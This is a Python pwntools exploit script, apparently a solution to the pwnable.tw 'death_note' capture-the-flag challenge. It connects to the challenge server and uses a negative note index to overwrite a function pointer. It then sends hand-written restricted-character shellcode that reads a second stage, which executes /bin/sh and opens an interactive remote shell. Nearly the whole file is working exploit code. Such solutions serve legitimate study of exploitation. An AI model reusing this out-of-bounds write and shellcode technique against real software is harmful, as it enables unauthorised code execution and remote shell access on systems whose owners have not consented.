from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF('./death_note', checksec=False)
# r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#         #    b*0x08048722
#         #    b*0x080487d3
#            b*0x080487ef
#            c
#         #    c
#         #    set *(int*)0x804a020 = 0xffffd50c
#         #    set $edx = 0xffffd50c
#         #    si ni 50
#            ''')
r = remote('chall.pwnable.tw', 10201)

def choice(choice, id = b'0', note = b'\x00'):
    r.sendafter(b'choice :', choice)
    if choice != b'4':
        r.sendafter(b'Index :', id)
        if note != b'\x00':
            r.sendafter(b'Name :', note)
        
payload = asm('''
            push ecx
            pop ebx
            push edx
            pop ecx
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop eax
            pop edi
            pop eax
            push edx
            pop esp
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            pop edx
            push 0x70
            pop edx
            push edi
            push edi
              ''')

payload += b'\x00'

byte = b'1' + b'a'*3 + b'\xCD\x80\x00\x00' + p32(0x3)

choice(byte , b'-16', payload)

payload = b'a'*54
payload += asm('''
            mov eax, 0xb
            add esp, 0x50
            push 0x0068732f
            push 0x6e69622f
            mov ebx, esp
            xor ecx, ecx
            xor edx, edx
            int 0x80
               ''')

r.sendline(payload)

r.interactive()